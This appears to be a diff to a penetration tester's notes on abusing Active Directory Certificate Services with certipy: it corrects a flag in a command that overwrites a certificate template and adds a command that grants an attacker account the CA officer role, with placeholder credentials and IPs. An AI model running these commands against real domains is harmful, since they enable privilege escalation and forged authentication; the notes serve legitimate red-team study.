@@ -23,5 +23,10 @@ certipy auth -pfx mycert.pfx -dc-ip 10.0.2.6
 Can be cracked with [[crackmapexec]]
 # Modifying Template
 ```
-certipy template -y 'attacker@corp.local' -p 'password' -dc-ip '10.0.0.100' -template 'targettmp' -write-default-configuration
+certipy template -u 'attacker@corp.local' -p 'password' -dc-ip '10.0.0.100' -template 'targettmp' -write-default-configuration
 ```
+# Giving CA Role
+```
+certipy ca -u `attacker@corp.local` -p 'password' -ns '10.0.0.100' -target 'CA.CORP.LOCAL' -ca 'CORP-CA' -add-officer 'attacker'
+```
+- Gives a CA officer role so attacker can approve/reject certificate requests
